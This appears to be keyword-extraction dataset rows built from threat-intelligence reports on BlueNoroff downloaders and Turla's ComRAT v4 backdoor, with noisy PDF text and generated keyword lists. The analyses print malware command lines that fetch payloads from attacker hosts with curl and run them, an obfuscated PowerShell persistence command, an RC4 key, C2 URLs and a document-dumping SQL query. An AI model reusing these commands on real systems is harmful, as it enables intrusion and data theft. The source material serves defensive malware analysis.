Windows executable file, and an encrypted Dump.bin file. The PDF and next stage payload. Upon launch, it copies the Dump.bin file to the %Templates%\war[current time][random value].bin (i.e., war166812964324445.bin). The Dump.bin has a modified PE header. The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key. The decrypted data is the header of a PE file, overwriting the recovered header to the original file. Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.The spawned downloader contains an encrypted configuration at the end of the file. The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file. They are located four bytes and eight bytes from the end of the file, respectively. The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3DStructure of configurationIn the case of another downloader, however, the payload URL was delivered using a command line functionality that checks the working environment. If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.5/12Infection flow of downloaderThis downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender. If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library. This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address. With this trick, the malware can disable the functionalities of EDR/AV products. Next, the malware creates a mutex to as a job offer from a Japanese multinational bank.If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands:Windows Defender: cmd /c timeout /t 10 & Del /f /q \”[current file name]\” & attrib -s -h \”[PDF decoy file]\” & rundll32 \”[current DLL file path]\” #1 Bitdefender: cmd /c timeout /t 10 & rundll32 \”[current DLL file path]\” #1The primary objective of this malware is to fetch the next stage payload. To do this, the malware uses the cURL library, combining cURL commands depending on the antivirus installed.Avira or Avast installed: curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d da Other cases: curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d dlNote that the user-agent name is “cur1-agent“, and the malware sends “da” POST data if the victim installed Avira or Avast; otherwise, the malware sends “dl” POST data. If the fetched data by cURL command contains6/12“<html>” and “curl:”, the malware decrypts the payload with a delivered 64-byte RC4 key.If Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\marcoor.dll” and spawns it with the rundll32.exe command with the payload URL.command: exe %TEMPLATES%\marcoor.dll #1 [payload URL]Otherwise, the malware doesn’t write the payload to the file and injects the fetched payload into the explorer.exe process. The fetched payload is a DLL type executable and its export function is spawned with the “payload URL”.Unfortunately, we haven’t been able to obtain a precise infection chain so far. From our telemetry, however, we can confirm the victim was eventually compromised by backdoor-type malware. Based on the malware’s static information, and parts of the internal code, we assess that the final payload is still very similar to the Persistence Backdoor #2[1] we described in our previous blog. Updated method #2: Scripts and novel downloaderAdditionally, we observed the download and launch of a suspicious batch file. The actor exploited different LOLBins. The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the system folder. This script is for executing the PowerShell script via a Windows scheduled task.1WScript.exe ""%system32%\SyncAppvPublishingServer.vbs"" ""n;cmd.exe '/c curl perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\regsile.bat & start /b %public%\regsile.bat'We also observed the context around that batch file in our telemetry. The batch file name is “What is Blockchain.bat“. As the file name suggests, this group still targets the blockchain industry. We acquired the file is a malicious HTML application file spawned by the mshta.exe process. Unfortunately, we don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry – showing the decoy document and fetching the next stage payload.1# Create a decoy password file and open it.2cmd.exe"" /c echo {PASSWORD}>%documents%\Userlink & notepad.exe %documents%\Userlink34# Fetch the payload with cURL command and execute.5cmd.exe"" /c timeout 10 & curl perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D -s -d md -A cur1-7/12agent -o %documents%\macroor.dll& %documents%\macroor.dll #1 perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3DAlso, we observed this group introduce a new Windows executable-type downloader at this time. This payload and executing it. Upon execution, it creates a fake file (wae.txt) to show a password composed of the string ‘password’ and fetches a payload from the embedded URL and loads it. This scheme, showing a password via notepad.exe, is a trick favored by the BlueNoroff group to avoid arousing the victim’s suspicion. Usually, the password contains the password needed to open the supplied encrypted decoy document.Simple downloader with fake password fileIt’s possible that the actor delivered the above Windows executable file in archive file format or disk image file format with an encrypted decoy document. InfrastructureWhile carrying out this research we found several C2 servers used by the actor. All the servers are hosted by VPS vendors as usual and several of them were resolved to the same IP address. The domain registration bankofamerica.us.org avid.lno-prima.lol avid.lno-prima.lol offerings.cloud ms.msteam.biz The Constant Company, LLC The Constant Company, LLCASNAS54290AS54290AS30823AS29802 AS20473 AS20473The actor usually used fake domains such as cloud hosting services for hosting malicious documents or payloads. They also created fake domains disguised as legitimate companies in the financial industry and investment companies. The domains, including pivoted domains, imitate venture capital names or big bank names. Most of the companies are Japanese companies, indicating the actor has a keen interest in Japanese markets.8/12Malicious domains beyondnextventures.co cloud.beyondnextventures.co smbc-vc.com cloud.mufg.tokyo mufg.tokyo vote.anobaka.infoit.zvc.capitalabf-cap.coangelbridge.capital mizuhogroup.us careers.mizuhogroup.us bankofamerica.us.org businessCountryJapanJapanVenture capital firm JapanJapanese multinational banking and financial services Bank in JapanGenuine company Beyond Next Ventures (url Venture capital firm Japan Sumitomo Mitsui Banking Corporation (url Mitsubishi UFJ Financial Group (url ANOBAKA (url Z Venture Capital (url ABF Capital (url Angel Bridge (url Mizuho Financial Group (url Bank of America (url Trans-Pacific Technology Fund (url capital firm Japan Bank and financial Venture capital firm TaiwanJapanUSAVenture capital firm JapanVenture capital firm JapanAs we described in the section ‘Long-lasting initial infection’, we discovered that one victim in the UAE, probably a home financing company, was compromised by classic BlueNoroff group malware. This financially motivated threat actor has been attacking various cryptocurrency-related businesses lately, but also other financial companies, as in this case.In addition, based on the domain naming and decoy documents, we assume, with low confidence, that the entities in Japan are on the radar of this group. In one PowerPoint sample, we observed that the actor took advantage of a Japanese venture capital company. Also, the samples we mentioned in the ‘Long-lasting initial infection’ section above were delivered to the victim with a Japanese file name, suggesting the target can read Japanese.9/12Decoy document ConclusionAccording to a recent report, the BlueNoroff group stole cryptocurrency worth millions using their cyberattack capabilities. It shows that this group has a strong financial motivation and actually succeeds in making profits from their cyberattacks. As we can see from our latest finding, this notorious actor has introduced slight modifications to deliver their malware. This also suggests that attacks by this group are unlikely to decrease in the near future. Indicators of compromiseDownloader hxxp://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= hxxp://avid.lno-prima[.]lol/NafqhbXR7KC/rTVCtCpxPH/kMjTqFDDNt/fiOHK5H35B/bM%3D hxxp://offerings[.]cloud/NafqhbXR7KC/rTVCtCpxPH/pdQTpFN6FC/Lhr_wXGXix/nQ%3D hxxps://docs.azure- protection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D hxxps://docs.azure- protection[.]cloud/%2BgFJKOpVX/4vRuFIaGlI/D%2BOfpTtg/YTN0TU1BNx/bMA5aGuZZP/ODq7aFQ%3D/%3D hxxps://docs.azure- protection[.]cloud/+gFJKOpVX/4vRuFIaGlI/D+OfpTtg/YTN0TU1BNx/bMA5aGuZZP/ODq7aFQ%3D/%3D hxxps://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYdPivoted IP address MITRE ATT&CK MappingTacticInitial AccessExecutionPersistenceTechnique T1566.001T1566.002 T1059.003T1059.005T1204.001T1204.002 T1547.008 T1027.002T1497.001T1055.002Defense EvasionT1553.005T1218.007T1218.011T1221Technique name Phishing: Spearphishing Attachment Phishing: Spearphishing Link Command and Scripting Interpreter: Windows Command Shell Command and Scripting Interpreter: Visual Basic User Execution: Malicious Link User Execution: Malicious File Boot or Logon Autostart Execution: LSASS Driver Obfuscated Files or Information: Software Packing Virtualization/Sandbox Evasion: System Checks Process Injection: Portable Executable Injection Subvert Trust Controls: Mark-of-the-Web Bypass System Binary Proxy Execution: Msiexec System Binary Proxy Execution: Rundll32 Template Injection11/12Command and Control ExfiltrationT1071.001Application Layer Protocol: Web ProtocolsT1041Exfiltration over C2 Channel[1] APT Intel report: BlueNoroff Launched a New Campaign To Attack Cryptocurrency Business12/12 ","{'phrases': ['BlueNoroff', 'The doc', 'UAC', 'a downloader', 'Visual Basic Script', 'Batch', 'the download', 'Windows', 'binaries', 'detection', '-s', '-A', 'Control', 'a DLL', 'Explorer', 'an encrypted configuration', 'cURL', 'the final payload', 'the victim', 'additional malware', 'a shortcut', 'PE', 'the shortcut', 'infection', 'MOTW', 'ISO', 'VHD', 'scripts', '10', 'financial companies', 'Targets', 'Japan'], 'target': 'BlueNoroff; The doc; UAC; a downloader; Visual Basic Script; Batch; the download; Windows; binaries; detection; -s; -A; Control; a DLL; Explorer; an encrypted configuration; cURL; the final payload; the victim; additional malware; a shortcut; PE; the shortcut; infection; MOTW; ISO; VHD; scripts; 10; financial companies; Targets; Japan.'}"
Turla; ComRAT; malware; commands; Download; exfiltrating files; 10; the operator; commands; data; 12; a command; control; servers; 17; the orchestrator; 19; the network; a command; control; a command; control.,"["" 1. Turla operators gain an initial foothold on the victim's system through means like spearphishing or watering hole attacks. 2. They use this access to install and deploy the ComRAT malware, often using a PowerShell script. 3. ComRAT installs itself persistently using a scheduled task to regularly launch its orchestrator component. 4. The orchestrator injects the communications module into the default web browser process. 5. ComRAT connects to its command and control server over HTTP or via the Gmail web interface. 6. The operators send commands to gather sensitive documents from the victim's systems. 7. ComRAT compresses and encrypts any collected documents. 8. The documents are exfiltrated out to cloud storage services through protocols like HTTPS. 9. Turla operators retrieve the documents from the cloud services and can maintain persistent access to the victim. 10. If needed, additional malware tools can be deployed on the infected system for further control. 11. ComRAT is kept continually updated via its command and control channels. ""]","Extract the keywords: ESET Research White Paper // May 2020FROM AGENT.BTZ TO COMRAT V4A ten-year journeyMatthieu FaouTABLE OF CONTENTS LIST OF TABLES Table 1List of backdoor commands in ComRAT v419LIST OF FIGURES Figure 4Timeline of important attacks attributed to Turla 5 ComRAT v4 PDB path 7 Timeline of ComRAT 7 SQL command to dump documents from the central database (partially redacted) 8 Command to mount a OneDrive folder using net use (partially redacted) 8 Figure 5 Basic recon of the compromised machine 8 Figure 6 Turla operators’ working hours 9 Figure 7 Injection of the orchestrator into the Explorer process 10 Figure 8 Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy 10 Figure 9 Summary of ComRAT architecture 11 Figure 10 Figure 11 Business hours check 12 Figure 12 Example of Abstract Factory method pattern 12 Figure 13 Example of Adapter pattern 12 Figure 14 Example of Mediator pattern 12 Figure 15 First bytes of the decrypted FAT16 Virtual File System 13 Figure 16 Virtual File System hierarchy 14 Figure 17 Content of /etc/transport/legacy/get.list 14 Figure 18 Generation of the pipe name 15 Figure 19 Overview of the email C&C mode 16 Figure 20 Contents of /etc/transport/mail/mailboxes/0/cookie.str(partially redacted) 16 Figure 21 Example of the Gmail simplified HTML view (for demonstration purpose only) 17 Figure 22 Contents of /etc/transport/mail/service/subject 17 Figure 23 Email from the Gmail inbox that contains commands in the attachment (partially redacted and opened in Microsoft Outlook for demonstration purposes only) 17 Figure 24 Decrypted attachment 18 Figure 25 Email sent by ComRAT to the operators’ email address(partially redacted and opened in Microsoft Outlook for demonstration purposes only) 1941. EXECUTIVE SUMMARY Turla, also known as Snake, is one of oldest cyberespionage groups still active, with more than a decade of experience. Its operators mainly focus on high-profile targets such as governments and diplomatic entities in Europe, Central Asia and the Middle East. They are known for having breached major organizations such as the US Department of Defense in 2008 and the Swiss defense company RUAG in 2014. More recently, several European countries including France and the Czech Republic went public to denounce Turla’s attacks against their governments.To perform these operations, Turla’s operators maintain a large arsenal of malware including a rootkit, several complex backdoors aimed at different platforms, including Microsoft Exchange mail servers, and a large range of tools to enable pivoting on a network.In this white paper, we present our analysis of the latest version of one their oldest backdoors, publicly known as ComRAT. Key points in this white paper:• Turla has used ComRAT since at least 2007. • ComRAT v4 was first seen in 2017 and known still to be in use as recently as January 2020. • We identified at least three targets: two Ministries of Foreign Affairs and a national parliament. • ComRAT was used to exfiltrate sensitive documents. The operators used public cloud servicessuch as OneDrive and 4shared to exfiltrate data.• ComRAT is a complex backdoor developed in C++. • ComRAT uses a Virtual File System formatted in FAT16. • ComRAT is deployed using existing access methods, such as the PowerStallion PowerShell backdoor [1]. • ComRAT has two Command and Control channels• HTTP: It uses exactly the same protocol as ComRAT v3 • Email: It uses the Gmail web UI to receive commands and exfiltrate data• ComRAT can perform many actions on the compromised computers, such as executing additionalprograms or exfiltrating files.52. TURLA PROFILE Turla, also known as Snake, is an infamous espionage group active for at least a decade. The group is well known for its advanced custom tools and its ability to run highly targeted operations.2.1 Publicized high-profile attacks Over the past ten years, Turla has been responsible for numerous high-profile breaches. The targets include the United States Central Command in 2008 [2], the Finnish Ministry of Foreign Affairs in 2013 [3], the Swiss military company RUAG in 2014 [4] and the German Foreign Office in 2017 [5]. More recently, they allegedly compromised the French Armed Forces in 2018 [6] and the Austrian Foreign Ministry in 2019 [7]. The timeline in Figure 1 presents some of the major attacks attributed to Turla.(cid:31)(cid:30)(cid:30)8(cid:31)(cid:30)(cid:29)(cid:27)(cid:31)(cid:30)(cid:29)(cid:26)US Central CommandFinnish Foreign MinistryRUAG defense company(cid:31)(cid:30)(cid:29)(cid:25)German Foreign O(cid:4)ce(cid:31)(cid:30)(cid:29)(cid:24)(cid:31)(cid:30)(cid:29)8Austrian Foreign MinistryFrench Armed ForcesFigure 1 // Timeline of important attacks attributed to Turla2.2 Victimology As opposed to some other APT (Advanced Persistent Threat) groups, Turla is far from being opportunistic in the selection of its targets. The group is interested in collecting information from strategic organizations. In addition, to our knowledge, Turla has never conducted cybersabotage operations, such as those made by GreyEnergy [8] or TeleBots [9].With several years of experience tracking this espionage group, we have identified the most at-risk types of organizations:• Ministries of Foreign Affairs and diplomatic representations (embassies, consulates, etc.) • Military organizations • Regional political organizations • Defense contractorsOther APT groups might also be targets of interest for Turla. In June 2019, Symantec reported [10] that Turla had hijacked OilRig infrastructure and used it to drop its own malware onto existing OilRig victims’ networks.According to our telemetry and public information, Turla seems to target organizations in most parts of the world. Moreover, over the past few years, we have noticed that geographical areas of conflict, such as Eastern Europe and the Middle East, are under heavy attack from this APT group. However, even with this recent focus, it has not abandoned its traditional targets in Western Europe and Central Asia.62.3 Tools and tactics The usual modus operandi of Turla’s operators is to use basic first-stage malware for initial reconnaissance. In some cases they even use generic tools such as Metasploit [11] [12]. If they deem a victim interesting enough, they switch to more advanced malware such as Carbon [13] or Gazer [14].The initial compromise is generally tailored towards specific types of victims. They mainly rely on spearphishing emails [15], watering hole attacks [16] [17] or Man-in-the-Middle attacks [18].After this initial compromise step, they move laterally on the network and collect credentials. To avoid suspicious communications to the internet, they developed tools such as DarkNeuron [19] and RPC Backdoor [1], to forward commands and exfiltrate data from the local network. They also regularly create user accounts that they use later if they lose access to a compromised machine. This all means that once compromised, it is very hard to eject the attacker from the network without rebuilding most of it.Finally, collected data are exfiltrated through various channels such as HTTP, email or cloud storage. Turla’s operators usually rely on compromised web servers for the first C&C level. They are also known for using Cloudflare and SATCOM IP addresses to hide the real destination of this traffic [20].Turla’s operators have at their disposal a wide arsenal of malware tools for all major desktop platforms: Windows, macOS and Linux. Some of these tools stand out for their complexity, such as the Snake rootkit, which relies on a vulnerable VirtualBox driver to bypass Windows Driver Signature Enforcement [21]. Some others stand out for their originality, such as the Outlook backdoor we analyzed in 2018 [22] or LightNeuron, a backdoor targeting Microsoft Exchange [23].During our several years of tracking Turla’s activities, we have also noticed that its operators react quickly to both detection and publication. Apparently, they do not hesitate to remove their tools and clean some artefacts such as malware logs, and potentially lose control of a machine, if they feel they will be detected soon. They probably do not want their more-advanced malware to be exposed publicly.3. OVERVIEW3.1 From Agent.BTZ to ComRAT v4 Agent.BTZ is a Remote Access Trojan (RAT) that became infamous after its use in a breach of the US military in 2008 [24]. The first version of this malware, seen in 2007, exhibited worm capabilities by spreading through removable drives. Later, this malware family, along with other families such as the Snake rootkit, was attributed to an APT group dubbed Turla.From 2007 to 2012, two new major versions of the RAT, later named ComRAT, were released as described by G DATA [25]. Interestingly, both employed the well-known Turla XOR key:1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6 gs923HL34x2f5cvd0fk6c1a0sThen, and until mid-2017, Turla developers made a few changes to ComRAT but it was still using a very similar code base.In 2017, we noticed that a very different version of ComRAT was released. As shown in Figure 2, it is version 4 of a malware family its authors dubbed Chinch. It was also the internal name the developers used for the previous versions.7Figure 2 // ComRAT v4 PDB pathThis new version uses a completely new code base and is far more complex than its predecessors. It takes some inspiration from Snake, the rootkit used by Turla with, for instance, a Virtual File System formatted in FAT16. Figure 3 provides an overview of ComRAT history.(cid:31)(cid:30)(cid:30)(cid:28)(cid:31)(cid:30)(cid:30)(cid:26)(cid:31)(cid:30)(cid:30)(cid:26)ComRAT v(cid:12) releaseBreach at the US military using ComRATComRAT v(cid:1) release(cid:31)(cid:30)(cid:27)(cid:30)(cid:31)(cid:30)(cid:29)(cid:28)(cid:31)(cid:30)(cid:29)(cid:28)ComRAT v(cid:8) use still continuingComRAT v(cid:8) releaseLast known ComRAT v(cid:16) activityFigure 3 // Timeline of ComRAT(cid:31)(cid:30)(cid:29)(cid:27)ComRAT v(cid:16) release3.2 Targeting During our investigation, we were able to identify three different targets where ComRAT v4 has been used:• Two Ministries of Foreign Affairs in Eastern Europe • One national parliament in the Caucasus regionThis targeting is in-line with other campaigns we described in the past.3.3 Attribution to Turla Based on the victimology and the TTPs, we believe that ComRAT is used exclusively by a single APT group.Moreover, there are a few elements linking ComRAT v4 to Turla:It uses the same internal name, Chinch, as the previous versions It uses the same custom C&C protocol over HTTP as ComRAT v3 • A part of the network infrastructure is shared with Mosquito [18] It was dropped by, or has dropped other, Turla malware families: • • A PowerShell loader [1] • The PowerStallion backdoor [1] • The RPC Backdoor [1]Therefore, we believe that the ComRAT v4 malware family is part of the Turla arsenal.Insight into attacker’s activity3.4 During our investigation, we were able to get insights about what Turla operators were doing on the compromised machines.The main use of ComRAT is discovering, stealing and exfiltrating confidential documents. In one case, its operators even deployed a .NET executable to interact with the victim’s central MS SQL Server database containing the organization’s documents. Figure 4 is the redacted SQL command.8sqlCommand.CommandText = “select top “ + num2.ToString() + “ filename, img, datalength(img), id from <Redacted> with(nolock) where not img is null and id>” + num4. ToString(); sqlCommand.CommandText += “ and datalength(img)<1500000 and (filename like ‘%.doc’ or filename like ‘%.docx’ or filename like ‘[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf’ or (filename like ‘3%.pdf’ and len(filename)>9))”; sqlCommand.CommandText += “ order by id”;Figure 4 // SQL command to dump documents from the central database (partially redacted)These documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive or 4shared. Cloud storage is mounted using the net use command as shown in Figure 5.tracert -h 10 yahoo.com net use url <redacted password> /u:<redacted>@aol.co.uk tracert -h 10 yahoo.comFigure 5 // Command to mount a OneDrive folder using net use (partially redacted)In addition to document stealing, the operators also run many commands to gather information about the Active Directory groups or users, the network or Microsoft Windows configurations such as the group policies. Figure 6 is a list of commands executed by Turla operators.gpresult /z net view /domain net user administrator net user /domain net group net group /domain net localgroup Administrators net group “Domain Computers” /domain net group “Domain Admins” /domain net group “Domain Controllers” /domain dir “%programfiles%” net group “Exchange Servers” /domain net accounts net accounts /domain ipconfig /displaydnsFigure 6 // Basic recon of the compromised machine9Finally, we also noticed that Turla operators are aware of and try to evade security software. For instance, they regularly exfiltrate security-related log files in order to understand whether their malware samples have been detected. This shows the level of sophistication of this group and its intention to stay on the same machines for a long time.We also extracted the times at which Gmail received the emails sent by the operators, which should be very close to the time at which commands were sent by the operators through the email C&C channel. We believe this is a good metric because the emails are later processed by the backdoor. Thus, it shows the time at which the operators were working and not the time at which the infected computer executed malicious commands.Figure 7 represents the time of day that commands were sent, in a one-month period. Given the distribution, it is likely that the operators are working in the UTC+3 or UTC+4 time zone.(cid:29)(cid:31)(cid:25)(cid:31)(cid:30)(cid:31)(cid:31)Number of emails receivedUTC timezoneUTC+(cid:27) timezone(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:31)(cid:26)(cid:30)(cid:26)(cid:29)(cid:26)(cid:28)(cid:26)(cid:27)(cid:30)(cid:31)(cid:30)(cid:30)HourFigure 7 // Turla operators’ working hours4. COMRAT V4 According to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4 was compiled in April 2017. The most recent iteration of the backdoor was, to the best of our knowledge, compiled in November 2019. In this section, we will describe a sample compiled in March 2019, but it is very similar to the latest version.Installation and persistence4.1 Based on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised credentials or via another Turla backdoor. For instance, we’ve seen ComRAT installed by PowerStallion, a PowerShell-based backdoor we described in 2019 [1].The ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills a registry value with the encrypted payload. The registry value is usually HKLM\SOFTWARE\Microsoft\SQMClient\Windows.WSqmCons10The Windows task is usually in C:\Windows\System32\Tasks\Microsoft\Windows\ Customer Experience Improvement Program\Consolidator and contains the following command:<Exec><Command>cmd.exe</Command> <Arguments>/c “%SystemRoot%\System32\wsqmcons.exe &amp; powershell.<Actions Context=”WinSQMAccount”> exe -v 2 “$QAY076ai = ‘AKWC;HUA389933tomasoas’;[Text.Encoding]::ASCII. GetString([Convert]::\”Fr`omBa`se6`4Str`ing\”((gp HKLM:\SOFTWARE\Microsoft\SQMClient\ Windows).WSqmCons))|iex;””</Arguments> </Actions>Note that the password used to decrypt the ComRAT payload is different on each machine.It is interesting to note that while ComRAT’s name is derived from its use of COM object hijacking, in this new version the developers no longer use this method for ensuring persistence.4.2 Orchestrator The PowerShell loader is executed every time the user logs in. It is very similar to the cluster of loaders we described in 2019 [1] and is based on the Invoke-DllInjection loader from the PowerSploit framework. It loads the ComRAT orchestrator DLL into explorer.exe as shown in Figure 8.Figure 8 // Injection of the orchestrator into the Explorer processThis is a C++ DLL existing in 32- and 64-bit versions. It has two exports named UMEP and VFEP. The 64-bit version is called x64_Release.dll as shown in Figure 9.Figure 9 // Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy11The orchestrator embeds an encrypted (XORed with a hardcoded key) communication module (a 32- or 64-bit DLL) that will be injected into the default web browser. The orchestrator interacts with the ComRAT communication module (described in more detail later) through a named pipe. Thus, all of the malware’s network communications will be initiated in the browser process, which is stealthier than if it was done directly by the orchestrator.The orchestrator has some interesting features such as a Virtual File System (VFS) in FAT16 format, which we describe later, and it can use Gmail to receive commands and to exfiltrate information to the operators. Figure 10 is an overview of ComRAT’s architecture.Existing accessto the victim's computerEx: PowerStallionExecute</>PowerShellscriptWriteCreateEncrypted payload in Windows RegistryWindows task for persistencecommunicationInjectlibraryDefault browserC&C ServerGMAILGmail addressLoad payload in explorer.exeexeOrchestrator runningin explorer.exeHTTP request/responsein a named pipeVirtual FAT‹Œ File System>_CommandsExﬁltrate documents to various cloud servicesNetwork and Active Directory reconDrop and execute additional malware programsMonitor security logsTurla operatorFigure 10 // Summary of ComRAT architecture12The orchestrator is programmed to sleep outside local business hours (9 to 5, Monday to Friday), as shown in Figure 11.Figure 11 // Business hours check4.3 Development Our in-depth analysis of this malware family leads us to believe that the ComRAT developers are both experienced and spent time designing the malware architecture.We noticed that they used several design patterns. For example, they use the so-called Abstract Factory pattern [26] in the code responsible for parsing and creating instructions based on C&C communications, as shown in Figure 12. It is interesting to note that it was implemented using a C++ template. Thus, there is a lot of duplicated code in the compiled binary because each templated class or function will have a different implementation for each type it is used with.Figure 12 // Example of Abstract Factory method patternThey also have used other design patterns, such as the Adapter pattern [27], shown in Figure 13, and the Mediator pattern [28], shown in Figure 14.Figure 13 // Example of Adapter patternFigure 14 // Example of Mediator patternIt should be noted that, in addition to complex elements such as a FAT16 VFS, ComRAT’s developers use some obfuscation. Most of the strings in their binaries are string-stacked and encrypted, with a different key per sample, with the apparent goal of preventing easy detection of this malware family.Finally, they use several third-party libraries:• fat_io_lib: for the Virtual File System • Gumbo: to parse HTML • wolfCrypt: for C&C data (en|de)cryptionOverall, it tells us that the Turla group tasked experienced developers for this new version of ComRAT. Both the development effort and the technologies used, such as the Virtual File System, make it a counterpart of Carbon [13] and Gazer [14].134.4 Virtual File System and configuration All the files related to ComRAT, except the orchestrator DLL and scheduled task, are stored in a Virtual File System. This is a regular file stored at one of these locations:• %TEMP%\FXSAPIDebugTrace.txt • %TEMP%\iecache.bin However, once decrypted, these files are FAT16 partition images, as shown in Figure 15.Figure 15 // First bytes of the decrypted FAT16 Virtual File SystemThe encryption key is unique per machine, as it is generated during the installation. It uses a variant of Mersenne Twister and takes its seed from std::_Random_device. This 32-byte key is then stored in (HKLM|HKCU)\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\ {59031A47-3F72-44A7-80C5-5595FE6B30EE}\Order The VFS is encrypted using AES-256 in XTS mode. This mode of operation is a standard for disk encryption. The first 16-bytes of the key are used for the block encryption while the last 16-bytes are used to derive the initialization vector from the sector number.The default VFS container file is hardcoded in the orchestrator and dropped the first time it is executed. Then, most of the files can be updated using backdoor commands.It uses UNIX-like paths so, for example, the log file is located at /var/log/working.c4log. The malware uses a third-party library, fat_io_lib, to read the partition. Figure 16 is an overview of the files and folders in the VFS.14FAT(cid:28)(cid:27) Virtual File Systemvarlogworking.c(cid:143)logbin<Executables>Contains log ﬁlesContains the conﬁguration related to C&C communicationsProbably contains modules (cid:14)PE executables(cid:11) but we haven’t seen any in the wild.Contains the encryption keys (cid:14)AES and RSA(cid:11) used for the C&C communicationsContains backdoor commands that will be executed automatically. For example, /etc/auto_exec/send_log.c4 executes the backdoor command 106: SendWorkingLog.Contains commands executed at startup.etctransportmailmailboxes(cid:4)command_addr.str answer_addr.str cookie.strserviceindex.int subject.strlegacyget.list post_fault_count.intservicecurrent_transport.str timeout.intpkiaes_key.pki public_cert.pki id.pkiauto_execsend_log.c(cid:143)init_ddir_set_ipconﬁg.c(cid:143)Figure 16 // Virtual File System hierarchyIt is interesting to note that some files use extensions such as c4 or c4log, where c4 most likely stands for Chinch 4, the internal name of the malware family.By mounting the Virtual File System, we get access to all these files. Figure 17 is an example of /etc/transport/legacy/get.list content. This is a list of C&C domains separated with a pipe.Figure 17 // Content of /etc/transport/legacy/get.list154.5 Command & Control channels ComRAT v4 has two different C&C channels: HTTP (internally known as legacy) and email (internally known as mail), which uses the Gmail web interface. The mode to be used (legacy, mail or any) is specified in the file /etc/transport/service/current_transport.strCommunication module The orchestrator retrieves the default browser, by checking HKCR\http\shell\open\command, and injects the communication DLL, either 32- or 64-bit, into it. These DLLs are hardcoded in the orchestrator and XORed with a static key.This module is quite simple as it is just a “bridge” between the orchestrator and the C&C server. The goal is probably to make the malware’s HTTP requests to its C&C appear to be from a process that would be expected to connect to the internet and make HTTP requests.The orchestrator uses a named pipe to interact with the communication module. The pipe name is derived from the computer name as shown on Figure 18.Figure 18 // Generation of the pipe nameThe orchestrator sends C&C requests to the communication module, which sends them to the C&C server, and that module sends any responses or new commands from the C&C server to the orchestrator, using the same pipe.The communication DLL is slightly obfuscated, in a very similar way to many other Turla malware families. All the strings are string-stacked, some of them XORed, and most of the Windows APIs it uses are resolved dynamically.Legacy/HTTP[S] The most basic C&C mode is what the ComRAT developers called legacy mode. Indeed, it is the exact same protocol as implemented in ComRAT v3.x.We believe that it is intended to be compatible with C&C servers already in place, avoiding the need to deploy a whole new set of servers. It also gives the operators the flexibility to control old ComRAT instances without the need to upgrade all the victims to version 4. Even if this is an old C&C protocol, it was still being used in the wild in 2020.Two lists of C&C servers are stored in the VFS at the paths: /etc/transport/legacy/get.list and /etc/transport/legacy/post.list They generally each contain two or three different domains, separated with a pipe character.The format of the URL is quite easy to recognize as it hasn’t changed for years: http[s]://<C&C domain>/index/index.php?h=<base64 XOR key>&d=<base64 XORed data> The h parameter contains an 8-byte XOR key encoded in base64. It is generated using the rand function seeded by the result of a call to the GetTickCount function. The d parameter contains the base64-encoded data. It is encrypted using the XOR key in the h parameter.16Email The second C&C mode is called mail by ComRAT developers. The code is actually very specific to Gmail and we haven’t seen any other version of ComRAT able to use another email provider.A basic overview of the email C&C mode is shown Figure 19.ComRATRead the email address and the authentication cookies in the VirtualFile SystemConnect to the Gmail web UIParse the HTMLof the inboxDownload the emailattachmentsDecrypt each attachmentExecutethe commandsSend the result back by email(cid:25)(cid:24)(cid:23)(cid:22)(cid:21)(cid:20)(cid:19)Sendcommandsby emailControlthe mailboxOperator mailbox(cid:31)often on GMX(cid:21)Turla operatorcommand resultsReceiveby emailFigure 19 // Overview of the email C&C modeStep 1The orchestrator reads the email address in /etc/transport/mail/mailboxes/0/command_addr It also reads the cookies to authenticate on Gmail in /etc/transport/mail/mailboxes/0/cookie These cookies typically have a limited lifetime so they should be updated from time to time. Figure 20 is a redacted screenshot of the contents of the cookie file.Figure 20 // Contents of 